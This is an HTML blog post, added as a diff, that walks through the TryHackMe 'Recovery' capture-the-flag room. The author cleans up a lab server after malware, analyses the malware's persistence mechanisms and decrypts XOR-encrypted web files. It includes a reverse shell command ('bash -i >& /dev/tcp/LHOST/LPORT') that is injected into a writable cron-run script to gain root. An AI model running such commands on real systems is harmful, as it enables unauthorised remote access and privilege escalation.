@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>TryHackMe: Recovery Write-Up</title>
+
+	<!-- Favicon -->
+	<link rel="shortcut icon" href="../img/favicon.ico" type="image/icon">
+	<link rel="icon" href="../img/favicon.ico" type="image/icon">
+
+	<!-- Bootstrap Core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Theme CSS -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Custom Fonts -->
+    <link href="../vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    Menu <i class="fa fa-bars"></i>
+                </button>
+                <a class="navbar-brand" href="../">(´• ω •)</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="../">Home</a>
+                    </li>
+                    <li>
+                        <a href="../about/">About</a>
+                    </li>
+                    <li>
+                        <a href="../contact/">Contact</a>
+                    </li>
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header class="intro-header" style="background-image: url('../img/post13/image.jpeg')">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>TryHackMe: Recovery</h1>
+                        <h2 class="subheading">Difficulty: Medium</h2>
+						<span class="meta">Posted by <a href="../about/">Admin</a> on August 8, 2020</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Post Content -->
+    <article>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <p><a href="https://tryhackme.com/room/recovery">CTF link</a></p>
+
+					<p>Good day. Today I will be walkthought a machine from the TryHackMe.</p>
+
+					<li>Goal: recover the server after malware infection and decrypt the files.</li>
+
+					<h2 class="section-heading">Story</h2>
+
+
+                    <p>Hi, it's me, your friend Alex.</p>
+
+                    <p>I'm not going to beat around the bush here; I need your help. As you know I work at a company called Recoverysoft. I work on the website side of things, and I setup a Ubuntu web server to run it. Yesterday one of my work colleagues sent me the following email:</p>
+
+                    <pre><code>Hi Alex,
+A recent security vulnerability has been discovered that affects the web server. Could you please run this binary on the server to implement the fix?
+Regards
+- Teo</code></pre>
+                    <p>Attached was a linux binary called fixutil. As instructed, I ran the binary, and all was good. But this morning, I tried to log into the server via SSH and I received this message:</p>
+
+                    <pre><code>YOU DIDN'T SAY THE MAGIC WORD!
+YOU DIDN'T SAY THE MAGIC WORD!
+YOU DIDN'T SAY THE MAGIC WORD!</code></pre>
+
+                    <p>It turns out that Teo got his mail account hacked, and fixutil was a targeted malware binary specifically built to destroy my webserver!</p>
+                    <p>when I opened the website in my browser I get some crazy nonsense. The webserver files had been encrypted! Before you ask, I don't have any other backups of the webserver (I know, I know, horrible practice, etc...), I don't want to tell my boss, he'll fire me for sure.</p>
+                    <b>Please access the web server and repair all the damage caused by fixutil. You can find the binary in my home directory. Here are my ssh credentials:</b>
+                    <pre><code>Username: alex
+Password: madeline</code></pre>
+                    <p> <b>I have setup a control panel to track your progress on port 1337.</b> Access it via your web browser. As you repair the damage, you can refresh the page to receive those "flags" I know you love hoarding.</p>
+
+                    <p>Good luck!</p>
+                    <p>- Your friend Alex</p>
+
+
+
+
+
+                    <h2 class="section-heading">Help Alex!</h2>
+
+
+					<p>First i need to look at the web server.</p>
+
+					<a href="../img/post13/image1.png">
+                        <img class="img-responsive" src="../img/post13/image1.png" alt="">
+                    </a>
+
+                    <p>The web server files are encrypted.</p>
+
+                    <p>Flags will be displayed on port 1337. At the moment it is empty.</p>
+
+                    <a href="../img/post13/image2.png">
+                        <img class="img-responsive" src="../img/post13/image2.png" alt="">
+                    </a>
+
+                    <p>Now let's connect to the via ssh server.</p>
+
+                    <a href="../img/post13/image3.png">
+                        <img class="img-responsive" src="../img/post13/image3.png" alt="">
+                    </a>
+
+                    <pre><code>ssh alex@10.10.113.174 -p 22</code></pre>
+
+                    <p>After logging in via ssh, we see an endless repetition of the phrase YOU DIDN'T SAY THE MAGIC WORD!, which blocks the launch of commands, this may be due to the infection of the .bashrc file in the user's home directory, and we really cannot write anything when we loging, but if we enter not through <b>/bin/bash</b> but through  <b>/bin/sh</b> then we can bypass this.</p>
+
+                    <a href="../img/post13/image4.png">
+                        <img class="img-responsive" src="../img/post13/image4.png" alt="">
+                    </a>
+
+					<pre><code>ssh alex@10.10.113.174 -p 22 /bin/sh</code></pre>
+
+                    <p>When looking at the .bashrc file, I found a malicious line that was blocking the launch of commands via bash.</p>
+
+                    <pre><code>cat .bashrc</code></pre>
+
+                    <a href="../img/post13/image5.png">
+                        <img class="img-responsive" src="../img/post13/image5.png" alt="">
+                    </a>
+
+                    <p>
+
+                    <a href="../img/post13/image6.png">
+                        <img class="img-responsive" src="../img/post13/image6.png" alt="">
+                    </a>
+
+                    <pre><code>sed '$d' .bashrc</code></pre>
+
+                    <p>After I removed the malicious line with sed, I tried again to log in using <b>/bin/bash</b>, but the malware added the malicious line to the <b>.bashrc</b> file again, so I had to copy the .bashrc file to myself and delete the original. Even though I deleted the .bashrc file, the malware was terminating my bash session, so I will working using <b>/bin/sh</b>.</p>
+
+					<pre><code>rm -rf .bashrc</code></pre>
+
+
+                    <a href="../img/post13/image7.png">
+                        <img class="img-responsive" src="../img/post13/image7.png" alt="">
+                    </a>
+
+                    <p>In the meantime I got the first flag.</p>
+
+                    <a href="../img/post13/image8.png">
+                        <img class="img-responsive" src="../img/post13/image8.png" alt="">
+                    </a>
+
+					<pre><code>Flag 0: THM{d##############################e}</code></pre>
+
+                    <p>Now I need to find out how the malware works. In order to transfer the malware to my machine, I will use base64.</p>
+
+                    <a href="../img/post13/image9.png">
+                        <img class="img-responsive" src="../img/post13/image9.png" alt="">
+                    </a>
+
+                    <pre><code>base64 fixutil</code></pre>
+                    <pre><code>mkdir malware_files</code></pre>
+                    <pre><code>base64 -d file > malware_files/fixutil</code></pre>
+
+                    <p>Next, I use the ghidra utility to decompile the malware.</p>
+
+                    <p>Opening the fixutil file with ghidra and after careful analysis of the main function, I found out that it works like this:</p>
+
+					<ol>
+                        <li>Inserts a malicious line into the <b>.bashrc</b> file</li>
+                        <li>Copies the file <b>/lib/x86_64-linux-gnu/liblogging.so</b> to the file <b>/tmp/logging.so</b></li>
+                        <li>Runs the file <b>/bin/admin</b></li>
+					</ol>
+
+                    <a href="../img/post13/image10.png">
+                        <img class="img-responsive" src="../img/post13/image10.png" alt="">
+                    </a>
+
+                    <p>Now I need to analyse the /lib/x86_64-linux-gnu/liblogging.so library, I also use base64 for transfer.</p>
+
+                    <a href="../img/post13/image11.png">
+                        <img class="img-responsive" src="../img/post13/image11.png" alt="">
+                    </a>
+
+                    <pre><code>base64 /lib/x86_64-linux-gnu/liblogging.so</code></pre>
+                    <pre><code>base64 -d file2 > malware_files/liblogging.so</code></pre>
+
+
+
+                    <p>After analyzing the library, I realized that it does the following:</p>
+
+					<ol>
+                        <li>Copy <b>/tmp/logging.so</b> to <b>/lib/x86_64-linux-gnu/oldliblogging.so</b></li>
+                        <li>Creates a file <b>/root/.ssh/authorized_keys</b> for ssh authorization as root user.</li>
+                        <li>Creates a security user with root privileges.</li>
+                        <li>Creates a file <b>/opt/brilliant_script.sh</b> which kills bash processes.</li>
+                        <li>Creates an task "evil" that constantly runs the <b>/opt/brilliant_script.sh</b> file.</li>
+                    </ol>
+
+                    <a href="../img/post13/image12.png">
+                        <img class="img-responsive" src="../img/post13/image12.png" alt="">
+                    </a>
+
+                    <p>I need root access to restore the server further, but how do I get it? take a look at the brilliant_script.sh file that is constantly being executed.</p>
+
+                    <a href="../img/post13/image13.png">
+                        <img class="img-responsive" src="../img/post13/image13.png" alt="">
+                    </a>
+
+                    <p>It looks like we can edit this file. With this we can get root privileges.</p>
+
+                    <p>Now I create reverse bash shell <b>/tmp/a.sh</b> and add its launch to the malware script. After a few minutes, I get a root shell.</p>
+
+                    <a href="../img/post13/image14.png">
+                        <img class="img-responsive" src="../img/post13/image14.png" alt="">
+                    </a>
+
+					<pre><code>cat > /tmp/a.sh << "EOF"</code></pre>
+                    <pre><code>#!/bin/bash</code></pre>
+                    <pre><code>bash -i >& /dev/tcp/LHOST/LPORT 0>&1</code></pre>
+                    <pre><code>EOF</code></pre>
+                    <pre><code>echo "bash /tmp/a.sh" >> /opt/brilliant_script.sh</code></pre>
+
+                    <a href="../img/post13/image15.png">
+                        <img class="img-responsive" src="../img/post13/image15.png" alt="">
+                    </a>
+
+                    <p>Despite the fact that I received administrator rights, we must not forget that the brilliant_script.sh file closes bash processes, so you need to act quickly and efficiently.</p>
+
+                    <a href="../img/post13/image16.png">
+                        <img class="img-responsive" src="../img/post13/image16.png" alt="">
+                    </a>
+
+					<pre><code>cat /dev/null > /opt/brilliant_script.sh</code></pre>
+                    <pre><code>cat /dev/null > /etc/cron.d/evil</code></pre>
+                    <pre><code>cat /dev/null > /home/alex/.bashrc</code></pre>
+
+                    <p>Fine now i have neutralized it and changed root password. Now I can log in via ssh.</p>
+
+                    <a href="../img/post13/image17.png">
+                        <img class="img-responsive" src="../img/post13/image17.png" alt="">
+                    </a>
+
+                    <pre><code>ssh alex@10.10.113.174 -p 22</code></pre>
+
+					<p>Now I need to completely remove the malware files, security user from passwd and shadow files, authorized_keys from <b>/root/.ssh</b> directory, replace <b>liblogging.so</b> with <b>oldliblogging.so</b>.</p>
+
+                    <pre><code>rm -rf /etc/cron.d/evil</code></pre>
+                    <pre><code>rm -rf /opt/brilliant_script.sh</code></pre>
+                    <pre><code>rm -rf /home/alex/fixutil</code></pre>
+                    <pre><code>mv /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/liblogging.so</code></pre>
+                    <pre><code>rm -rf ~/.ssh/authorized_keys</code></pre>
+                    <pre><code>Edit shadow and passwd files with nano.</code></pre>
+
+                    <p>Now I got 4 more flags.</p>
+
+                    <a href="../img/post13/image18.png">
+                        <img class="img-responsive" src="../img/post13/image18.png" alt="">
+                    </a>
+
+                    <pre><code>Flag 1: THM{4#############################d}</code></pre>
+                    <pre><code>Flag 2: THM{7#############################2}</code></pre>
+                    <pre><code>Flag 3: THM{7#############################0}</code></pre>
+                    <pre><code>Flag 4: THM{b#############################d}</code></pre>
+
+                    <p>Now i need to decrypt the site files in <b>/usr/local/apache2/htdocs/</b> directory.</p>
+
+
+                    <p>The files are encrypted using XOR, so to decrypt them I will use this <a href="https://github.com/AlexFSmirnov/xor-decrypt">script</a> and key from the <b>/opt/.fixutil/backup.txt</b> file. Also I use scp to transfer files to my computer.</p>
+
+                    <a href="../img/post13/image19.png">
+                        <img class="img-responsive" src="../img/post13/image19.png" alt="">
+                    </a>
+                    <p></p>
+                    <a href="../img/post13/image20.png">
+                        <img class="img-responsive" src="../img/post13/image20.png" alt="">
+                    </a>
+
+                    <p>After decryption, I run simplehttpserver and download them on the server.</p>
+
+					<pre><code>curl http://LHOST/todo.dec.html -o todo.html</code></pre>
+                    <pre><code>curl http://LHOST/index.dec.html -o index.html</code></pre>
+                    <pre><code>curl http://LHOST/reallyimportant.dec.txt -o reallyimportant.txt</code></pre>
+
+                    <a href="../img/post13/image21.png">
+                        <img class="img-responsive" src="../img/post13/image21.png" alt="">
+                    </a>
+
+                    <p>And i got final 5th flag.</p>
+
+                    <a href="../img/post13/image22.png">
+                        <img class="img-responsive" src="../img/post13/image22.png" alt="">
+                    </a>
+
+					<pre><code>Flag 5: THM{0##############################2}</code></pre>
+
+			   </div>
+            </div>
+        </div>
+    </article>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="https://twitter.com/laf3r_" title="I'm on Twitter">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Copyright &copy; laf3r.github.io 2019-2022</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="../vendor/jquery/jquery.min.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="../vendor/bootstrap/js/bootstrap.min.js"></script>
+
+    <!-- Contact Form JavaScript -->
+    <script src="../js/jqBootstrapValidation.js"></script>
+    <script src="../js/contact_me.js"></script>
+
+    <!-- Theme JavaScript -->
+    <script src="../js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
